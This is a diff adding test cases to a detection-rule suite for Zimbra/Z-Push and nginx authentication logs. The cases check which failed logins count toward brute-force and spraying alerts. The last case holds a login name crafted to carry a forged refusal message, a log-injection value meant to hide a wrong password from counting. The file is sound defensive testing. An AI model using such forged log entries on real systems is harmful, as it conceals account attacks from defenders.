@@ -210,9 +210,9 @@
   {
    "log": "203.0.113.50 - - [11/Oct/2026:11:03:56 +0800] \"POST /Microsoft-Server-ActiveSync?User=victim&DeviceId=ABC&DeviceType=iPhone&Cmd=Sync HTTP/1.1\" 401 0 \"-\" \"python-requests/2.31\"",
    "location": "/var/log/nginx/access.log",
-   "expect_rule": "31101",
-   "expect_level": 5,
-   "note": "near-miss: a rejected ActiveSync POST still alerts through the built-in 400 rule"
+   "expect_rule": "132281",
+   "expect_level": 8,
+   "note": "synth (1.1 expected 31101): ActiveSync POST from python-requests, scripting tool user agent"
   },
   {
    "log": "203.0.113.50 - - [11/Oct/2026:11:03:56 +0800] \"POST /index.php?action=login HTTP/1.1\" 200 512 \"-\" \"curl/8.0\"",
@@ -673,6 +673,379 @@
    "expect_rule": "132220",
    "expect_level": 11,
    "note": "synth: admin success after brute force: correlation beats the admin rule"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [41234] [ERROR] [jdoe@example.com] Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Throw AuthenticationRequiredException to force a new connection/re-auth\n11/10/2026 11:20:01 [41234] [ INFO] [jdoe@example.com] User-agent: 'Apple-iPhone17C3/2307.90'\n11/10/2026 11:20:01 [41234] [FATAL] [jdoe@example.com] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Force client to reconnect.\n11/10/2026 11:20:01 [41234] [ INFO] [jdoe@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='jdoe@example.com' from='203.0.113.7' idle='0s' version='2.7.6 ' method='POST' httpcode='401' ",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132223",
+   "expect_level": 2,
+   "note": "synth from Zimbra backend r75 zimbra.php SoapRequest and Z-Push 2.7.6 index.php (ERROR, User-agent, FATAL, summary of one request); refusal \"throttle\": the 401 summary is re-labelled, not counted"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [41234] [ERROR] [jdoe@example.com] Zimbra->SoapRequest(): zimbra Auth Token has expired - Throw AuthenticationRequiredException to force a new connection/re-auth\n11/10/2026 11:20:01 [41234] [ INFO] [jdoe@example.com] User-agent: 'Apple-iPhone17C3/2307.90'\n11/10/2026 11:20:01 [41234] [FATAL] [jdoe@example.com] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Auth Token Expired - Force client to reconnect.\n11/10/2026 11:20:01 [41234] [ INFO] [jdoe@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='jdoe@example.com' from='203.0.113.7' idle='0s' version='2.7.6 ' method='POST' httpcode='401' ",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132223",
+   "expect_level": 2,
+   "note": "synth from Zimbra backend r75 zimbra.php SoapRequest and Z-Push 2.7.6 index.php (ERROR, User-agent, FATAL, summary of one request); refusal \"expired\": the 401 summary is re-labelled, not counted"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [41234] [ERROR] [jdoe@example.com] Zimbra->SoapRequest(): zimbra 2FA Auth Failed - Throw AuthenticationRequiredException to force a new connection/re-auth\n11/10/2026 11:20:01 [41234] [ INFO] [jdoe@example.com] User-agent: 'Apple-iPhone17C3/2307.90'\n11/10/2026 11:20:01 [41234] [FATAL] [jdoe@example.com] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): 2FA Auth Failed - Force client to reconnect.\n11/10/2026 11:20:01 [41234] [ INFO] [jdoe@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='jdoe@example.com' from='203.0.113.7' idle='0s' version='2.7.6 ' method='POST' httpcode='401' ",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132223",
+   "expect_level": 2,
+   "note": "synth from Zimbra backend r75 zimbra.php SoapRequest and Z-Push 2.7.6 index.php (ERROR, User-agent, FATAL, summary of one request); refusal \"2fa\": the 401 summary is re-labelled, not counted"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [41234] [ERROR] [jdoe@example.com] Zimbra->SoapRequest(): zimbra ActiveSync Disabled for user - Throw AuthenticationRequiredException to force a new connection/re-auth\n11/10/2026 11:20:01 [41234] [ INFO] [jdoe@example.com] User-agent: 'Apple-iPhone17C3/2307.90'\n11/10/2026 11:20:01 [41234] [FATAL] [jdoe@example.com] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): ActiveSync Disabled for user - Force client to reconnect.\n11/10/2026 11:20:01 [41234] [ INFO] [jdoe@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='jdoe@example.com' from='203.0.113.7' idle='0s' version='2.7.6 ' method='POST' httpcode='401' ",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132223",
+   "expect_level": 2,
+   "note": "synth from Zimbra backend r75 zimbra.php SoapRequest and Z-Push 2.7.6 index.php (ERROR, User-agent, FATAL, summary of one request); refusal \"disabled\": the 401 summary is re-labelled, not counted"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [41234] [ERROR] [jdoe@example.com] Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Throw AuthenticationRequiredException to force a new connection/re-auth\n11/10/2026 11:20:01 [41234] [ INFO] [jdoe@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='jdoe@example.com' from='203.0.113.7' idle='0s' version='2.7.6 ' method='POST' httpcode='401' ",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132223",
+   "expect_level": 2,
+   "note": "synth from Zimbra backend r75 zimbra.php SoapRequest and Z-Push 2.7.6 index.php (ERROR, User-agent, FATAL, summary of one request); the ERROR line alone (fatal line not yet handled) also marks the request"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [41234] [ERROR] [jdoe@example.com] Zimbra->SoapRequest(): SOAP FAULT: Error Code   [account.AUTH_FAILED] \n11/10/2026 11:20:01 [41234] [ERROR] [jdoe@example.com] Zimbra->SoapRequest(): zimbra Auth Failed - Throw AuthenticationRequiredException to force a new connection/re-auth\n11/10/2026 11:20:01 [41234] [FATAL] [jdoe@example.com] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Auth Failed - Force client to reconnect.\n11/10/2026 11:20:01 [41234] [ INFO] [jdoe@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='jdoe@example.com' from='203.0.113.7' idle='0s' version='2.7.6 ' method='POST' httpcode='401' ",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132210",
+   "expect_level": 5,
+   "note": "synth from Zimbra backend r75 zimbra.php SoapRequest and Z-Push 2.7.6 index.php (ERROR, User-agent, FATAL, summary of one request); near-miss: a wrong password (account.AUTH_FAILED) is still a counted rejected login"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [41299] [FATAL] [jdoe@example.com] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Force client to reconnect.\n11/10/2026 11:20:01 [41234] [ INFO] [jdoe@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='jdoe@example.com' from='203.0.113.7' idle='0s' version='2.7.6 ' method='POST' httpcode='401' ",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132210",
+   "expect_level": 5,
+   "note": "synth near-miss: the refusal was written by another process (pid), the summary is counted"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [41234] [FATAL] [asmith@example.com] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Force client to reconnect.\n11/10/2026 11:20:01 [41234] [ INFO] [jdoe@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='jdoe@example.com' from='203.0.113.7' idle='0s' version='2.7.6 ' method='POST' httpcode='401' ",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132210",
+   "expect_level": 5,
+   "note": "synth near-miss: same process, refusal for another account, the summary is counted"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [41231] [ERROR] [user1@example.com] Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Throw AuthenticationRequiredException to force a new connection/re-auth\n11/10/2026 11:20:01 [41231] [ INFO] [user1@example.com] User-agent: 'Apple-iPhone17C3/2307.90'\n11/10/2026 11:20:01 [41231] [FATAL] [user1@example.com] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Force client to reconnect.\n11/10/2026 11:20:01 [41231] [ INFO] [user1@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='user1@example.com' from='198.51.100.200' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [41232] [ERROR] [user2@example.com] Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Throw AuthenticationRequiredException to force a new connection/re-auth\n11/10/2026 11:20:01 [41232] [ INFO] [user2@example.com] User-agent: 'Apple-iPhone17C3/2307.90'\n11/10/2026 11:20:01 [41232] [FATAL] [user2@example.com] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Force client to reconnect.\n11/10/2026 11:20:01 [41232] [ INFO] [user2@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='user2@example.com' from='198.51.100.200' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [41233] [ERROR] [user3@example.com] Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Throw AuthenticationRequiredException to force a new connection/re-auth\n11/10/2026 11:20:01 [41233] [ INFO] [user3@example.com] User-agent: 'Apple-iPhone17C3/2307.90'\n11/10/2026 11:20:01 [41233] [FATAL] [user3@example.com] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Force client to reconnect.\n11/10/2026 11:20:01 [41233] [ INFO] [user3@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='user3@example.com' from='198.51.100.200' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [41234] [ERROR] [user4@example.com] Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Throw AuthenticationRequiredException to force a new connection/re-auth\n11/10/2026 11:20:01 [41234] [ INFO] [user4@example.com] User-agent: 'Apple-iPhone17C3/2307.90'\n11/10/2026 11:20:01 [41234] [FATAL] [user4@example.com] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Force client to reconnect.\n11/10/2026 11:20:01 [41234] [ INFO] [user4@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='user4@example.com' from='198.51.100.200' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [41235] [ERROR] [user5@example.com] Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Throw AuthenticationRequiredException to force a new connection/re-auth\n11/10/2026 11:20:01 [41235] [ INFO] [user5@example.com] User-agent: 'Apple-iPhone17C3/2307.90'\n11/10/2026 11:20:01 [41235] [FATAL] [user5@example.com] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Force client to reconnect.\n11/10/2026 11:20:01 [41235] [ INFO] [user5@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='user5@example.com' from='198.51.100.200' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [41236] [ERROR] [user6@example.com] Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Throw AuthenticationRequiredException to force a new connection/re-auth\n11/10/2026 11:20:01 [41236] [ INFO] [user6@example.com] User-agent: 'Apple-iPhone17C3/2307.90'\n11/10/2026 11:20:01 [41236] [FATAL] [user6@example.com] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Force client to reconnect.\n11/10/2026 11:20:01 [41236] [ INFO] [user6@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='user6@example.com' from='198.51.100.200' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [41237] [ERROR] [user7@example.com] Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Throw AuthenticationRequiredException to force a new connection/re-auth\n11/10/2026 11:20:01 [41237] [ INFO] [user7@example.com] User-agent: 'Apple-iPhone17C3/2307.90'\n11/10/2026 11:20:01 [41237] [FATAL] [user7@example.com] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Force client to reconnect.\n11/10/2026 11:20:01 [41237] [ INFO] [user7@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='user7@example.com' from='198.51.100.200' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [41238] [ERROR] [user8@example.com] Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Throw AuthenticationRequiredException to force a new connection/re-auth\n11/10/2026 11:20:01 [41238] [ INFO] [user8@example.com] User-agent: 'Apple-iPhone17C3/2307.90'\n11/10/2026 11:20:01 [41238] [FATAL] [user8@example.com] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Force client to reconnect.\n11/10/2026 11:20:01 [41238] [ INFO] [user8@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='user8@example.com' from='198.51.100.200' idle='0s' version='2.7.6 ' method='POST' httpcode='401' ",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132223",
+   "expect_level": 2,
+   "note": "synth from Zimbra backend r75 zimbra.php SoapRequest and Z-Push 2.7.6 index.php (ERROR, User-agent, FATAL, summary of one request); Z-Push not in zimbraHttpThrottleSafeIPs: eight accounts behind one carrier address are refused, 1.1 raised 132215 (spraying, active response); now none is counted"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [41241] [ERROR] [jdoe@example.com] Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Throw AuthenticationRequiredException to force a new connection/re-auth\n11/10/2026 11:20:01 [41241] [ INFO] [jdoe@example.com] User-agent: 'Apple-iPhone17C3/2307.90'\n11/10/2026 11:20:01 [41241] [FATAL] [jdoe@example.com] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Force client to reconnect.\n11/10/2026 11:20:01 [41241] [ INFO] [jdoe@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='jdoe@example.com' from='198.51.100.200' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [41242] [ERROR] [jdoe@example.com] Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Throw AuthenticationRequiredException to force a new connection/re-auth\n11/10/2026 11:20:01 [41242] [ INFO] [jdoe@example.com] User-agent: 'Apple-iPhone17C3/2307.90'\n11/10/2026 11:20:01 [41242] [FATAL] [jdoe@example.com] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Force client to reconnect.\n11/10/2026 11:20:01 [41242] [ INFO] [jdoe@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='jdoe@example.com' from='198.51.100.200' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [41243] [ERROR] [jdoe@example.com] Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Throw AuthenticationRequiredException to force a new connection/re-auth\n11/10/2026 11:20:01 [41243] [ INFO] [jdoe@example.com] User-agent: 'Apple-iPhone17C3/2307.90'\n11/10/2026 11:20:01 [41243] [FATAL] [jdoe@example.com] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Force client to reconnect.\n11/10/2026 11:20:01 [41243] [ INFO] [jdoe@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='jdoe@example.com' from='198.51.100.200' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [41244] [ERROR] [jdoe@example.com] Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Throw AuthenticationRequiredException to force a new connection/re-auth\n11/10/2026 11:20:01 [41244] [ INFO] [jdoe@example.com] User-agent: 'Apple-iPhone17C3/2307.90'\n11/10/2026 11:20:01 [41244] [FATAL] [jdoe@example.com] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Force client to reconnect.\n11/10/2026 11:20:01 [41244] [ INFO] [jdoe@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='jdoe@example.com' from='198.51.100.200' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [41245] [ERROR] [jdoe@example.com] Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Throw AuthenticationRequiredException to force a new connection/re-auth\n11/10/2026 11:20:01 [41245] [ INFO] [jdoe@example.com] User-agent: 'Apple-iPhone17C3/2307.90'\n11/10/2026 11:20:01 [41245] [FATAL] [jdoe@example.com] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Force client to reconnect.\n11/10/2026 11:20:01 [41245] [ INFO] [jdoe@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='jdoe@example.com' from='198.51.100.200' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [41246] [ERROR] [jdoe@example.com] Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Throw AuthenticationRequiredException to force a new connection/re-auth\n11/10/2026 11:20:01 [41246] [ INFO] [jdoe@example.com] User-agent: 'Apple-iPhone17C3/2307.90'\n11/10/2026 11:20:01 [41246] [FATAL] [jdoe@example.com] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Force client to reconnect.\n11/10/2026 11:20:01 [41246] [ INFO] [jdoe@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='jdoe@example.com' from='198.51.100.200' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [41247] [ERROR] [jdoe@example.com] Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Throw AuthenticationRequiredException to force a new connection/re-auth\n11/10/2026 11:20:01 [41247] [ INFO] [jdoe@example.com] User-agent: 'Apple-iPhone17C3/2307.90'\n11/10/2026 11:20:01 [41247] [FATAL] [jdoe@example.com] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Force client to reconnect.\n11/10/2026 11:20:01 [41247] [ INFO] [jdoe@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='jdoe@example.com' from='198.51.100.200' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [41248] [ERROR] [jdoe@example.com] Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Throw AuthenticationRequiredException to force a new connection/re-auth\n11/10/2026 11:20:01 [41248] [ INFO] [jdoe@example.com] User-agent: 'Apple-iPhone17C3/2307.90'\n11/10/2026 11:20:01 [41248] [FATAL] [jdoe@example.com] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Z-Push Server IP Address not listed in zimbraHttpThrottleSafeIPs - Force client to reconnect.\n11/10/2026 11:20:01 [41248] [ INFO] [jdoe@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='jdoe@example.com' from='198.51.100.200' idle='0s' version='2.7.6 ' method='POST' httpcode='401' ",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132223",
+   "expect_level": 2,
+   "note": "synth from Zimbra backend r75 zimbra.php SoapRequest and Z-Push 2.7.6 index.php (ERROR, User-agent, FATAL, summary of one request); the same for one account eight times, 1.1 raised 132214"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [41251] [ERROR] [user1@example.com] Zimbra->SoapRequest(): SOAP FAULT: Error Code   [account.AUTH_FAILED] \n11/10/2026 11:20:01 [41251] [ERROR] [user1@example.com] Zimbra->SoapRequest(): zimbra Auth Failed - Throw AuthenticationRequiredException to force a new connection/re-auth\n11/10/2026 11:20:01 [41251] [FATAL] [user1@example.com] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Auth Failed - Force client to reconnect.\n11/10/2026 11:20:01 [41251] [ INFO] [user1@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='user1@example.com' from='198.51.100.201' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [41252] [ERROR] [user2@example.com] Zimbra->SoapRequest(): SOAP FAULT: Error Code   [account.AUTH_FAILED] \n11/10/2026 11:20:01 [41252] [ERROR] [user2@example.com] Zimbra->SoapRequest(): zimbra Auth Failed - Throw AuthenticationRequiredException to force a new connection/re-auth\n11/10/2026 11:20:01 [41252] [FATAL] [user2@example.com] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Auth Failed - Force client to reconnect.\n11/10/2026 11:20:01 [41252] [ INFO] [user2@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='user2@example.com' from='198.51.100.201' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [41253] [ERROR] [user3@example.com] Zimbra->SoapRequest(): SOAP FAULT: Error Code   [account.AUTH_FAILED] \n11/10/2026 11:20:01 [41253] [ERROR] [user3@example.com] Zimbra->SoapRequest(): zimbra Auth Failed - Throw AuthenticationRequiredException to force a new connection/re-auth\n11/10/2026 11:20:01 [41253] [FATAL] [user3@example.com] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Auth Failed - Force client to reconnect.\n11/10/2026 11:20:01 [41253] [ INFO] [user3@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='user3@example.com' from='198.51.100.201' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [41254] [ERROR] [user4@example.com] Zimbra->SoapRequest(): SOAP FAULT: Error Code   [account.AUTH_FAILED] \n11/10/2026 11:20:01 [41254] [ERROR] [user4@example.com] Zimbra->SoapRequest(): zimbra Auth Failed - Throw AuthenticationRequiredException to force a new connection/re-auth\n11/10/2026 11:20:01 [41254] [FATAL] [user4@example.com] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Auth Failed - Force client to reconnect.\n11/10/2026 11:20:01 [41254] [ INFO] [user4@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='user4@example.com' from='198.51.100.201' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [41255] [ERROR] [user5@example.com] Zimbra->SoapRequest(): SOAP FAULT: Error Code   [account.AUTH_FAILED] \n11/10/2026 11:20:01 [41255] [ERROR] [user5@example.com] Zimbra->SoapRequest(): zimbra Auth Failed - Throw AuthenticationRequiredException to force a new connection/re-auth\n11/10/2026 11:20:01 [41255] [FATAL] [user5@example.com] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Auth Failed - Force client to reconnect.\n11/10/2026 11:20:01 [41255] [ INFO] [user5@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='user5@example.com' from='198.51.100.201' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [41256] [ERROR] [user6@example.com] Zimbra->SoapRequest(): SOAP FAULT: Error Code   [account.AUTH_FAILED] \n11/10/2026 11:20:01 [41256] [ERROR] [user6@example.com] Zimbra->SoapRequest(): zimbra Auth Failed - Throw AuthenticationRequiredException to force a new connection/re-auth\n11/10/2026 11:20:01 [41256] [FATAL] [user6@example.com] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Auth Failed - Force client to reconnect.\n11/10/2026 11:20:01 [41256] [ INFO] [user6@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='user6@example.com' from='198.51.100.201' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [41257] [ERROR] [user7@example.com] Zimbra->SoapRequest(): SOAP FAULT: Error Code   [account.AUTH_FAILED] \n11/10/2026 11:20:01 [41257] [ERROR] [user7@example.com] Zimbra->SoapRequest(): zimbra Auth Failed - Throw AuthenticationRequiredException to force a new connection/re-auth\n11/10/2026 11:20:01 [41257] [FATAL] [user7@example.com] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Auth Failed - Force client to reconnect.\n11/10/2026 11:20:01 [41257] [ INFO] [user7@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='user7@example.com' from='198.51.100.201' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [41258] [ERROR] [user8@example.com] Zimbra->SoapRequest(): SOAP FAULT: Error Code   [account.AUTH_FAILED] \n11/10/2026 11:20:01 [41258] [ERROR] [user8@example.com] Zimbra->SoapRequest(): zimbra Auth Failed - Throw AuthenticationRequiredException to force a new connection/re-auth\n11/10/2026 11:20:01 [41258] [FATAL] [user8@example.com] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Auth Failed - Force client to reconnect.\n11/10/2026 11:20:01 [41258] [ INFO] [user8@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='user8@example.com' from='198.51.100.201' idle='0s' version='2.7.6 ' method='POST' httpcode='401' ",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132215",
+   "expect_level": 10,
+   "note": "synth from Zimbra backend r75 zimbra.php SoapRequest and Z-Push 2.7.6 index.php (ERROR, User-agent, FATAL, summary of one request); near-miss: eight wrong passwords from one address are still spraying"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [41234] [FATAL] [x] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Auth Token Expired - Force client to reconnect.] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Auth Failed - Force client to reconnect.\n11/10/2026 11:20:01 [41234] [ INFO] [x] Exception: (AuthenticationRequiredException) - Zimbra->SoapRequest(): Auth Token Expired - Force client to reconnect.] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='x' from='203.0.113.7' idle='0s' version='2.7.6 ' method='POST' httpcode='401' ",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132210",
+   "expect_level": 5,
+   "note": "synth: a login name carrying a forged refusal message does not re-label its own wrong password"
+  },
+  {
